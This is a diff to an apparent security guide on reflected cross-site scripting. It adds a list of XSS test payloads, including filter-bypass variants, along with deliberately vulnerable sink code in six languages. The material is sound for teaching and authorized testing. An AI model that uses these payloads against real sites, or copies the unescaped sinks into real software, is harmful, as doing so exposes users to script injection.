@@ -30,6 +30,106 @@ Unlike stored XSS, the payload does not persist. The attacker typically delivers
 | **Weak controls** | Regex input filters only, `|safe` / `Markup()`, missing auto-escape, JavaScript string concat |
 | **High impact views** | Authenticated pages that reflect search terms, admin error handlers, password-reset flows |
 
+## Attack Payloads
+
+Use these in authorized tests when request parameters are echoed in the immediate HTML response. Craft full URLs for phishing simulations; replace `PAYLOAD` with the value for the vulnerable parameter.
+
+### Pattern 1: Query parameter script injection
+
+```text
+/search?q=<script>alert(document.domain)</script>
+/login?error=<img src=x onerror=alert(1)>
+/greet?name=<svg/onload=alert(1)>
+```
+
+### Pattern 2: Attribute context breakout
+
+```text
+?q="><script>alert(1)</script>
+?redirect_url=javascript:alert(1)
+?class=' onmouseover='alert(1)
+```
+
+### Pattern 3: Path or fragment reflection
+
+```text
+/page/<script>alert(1)</script>
+/404?path=</title><script>alert(1)</script>
+```
+
+### Pattern 4: Header or cookie echo
+
+```text
+Referer: https://evil.example/<script>alert(1)</script>
+Cookie: display_name=<img src=x onerror=alert(1)>
+```
+
+### Pattern 5: Filter bypass variants
+
+```text
+?q=<ScRiPt>alert(1)</ScRiPt>
+?q=<img src=x onerror=&#97;lert(1)>
+?q=<svg><script>alert&#40;1&#41;
+```
+
+### Pattern 6: DOM-based follow-on (when reflection lands in JS)
+
+```text
+?q=';alert(1)//
+?q=</script><script>alert(1)</script>
+?callback=alert(1)//  (JSONP-style sinks)
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+Reflected XSS sinks appear wherever request data is written into HTML in the same handler. Trace each parameter to these APIs.
+
+### Python (Flask / Jinja2)
+
+```python
+return f"<p>Results for: {request.args['q']}</p>"
+return render_template_string(f"<h1>{term}</h1>")
+return Markup(request.args.get("msg", ""))
+```
+
+### Java (JSP / servlets)
+
+```jsp
+Search: <%= request.getParameter("q") %>
+<c:out value="${param.error}" escapeXml="false"/>
+out.println("Hello " + request.getParameter("name"));
+```
+
+### C# (ASP.NET / Razor)
+
+```csharp
+return Content($"<p>Error: {Request.Query["msg"]}</p>", "text/html");
+@Html.Raw(Request.Query["q"])
+Response.Write(Request["term"]);
+```
+
+### JavaScript (Node / Express)
+
+```javascript
+res.send(`<h1>You searched for: ${req.query.q}</h1>`);
+document.body.innerHTML = location.search;
+res.render("search", { term: req.query.q, autoEscape: false });
+```
+
+### HTML (error pages and static responses)
+
+```html
+<p>Invalid input: <!-- reflected param inserted without encoding --></p>
+<meta http-equiv="refresh" content="0;url=REFLECTED_URL">
+```
+
+### Go
+
+```go
+fmt.Fprintf(w, "<p>Query: %s</p>", r.URL.Query().Get("q"))
+template.HTML(reflectedTerm)  // disables escaping
+```
+
 ## Sample Vulnerable Code in Python
 
 ```python
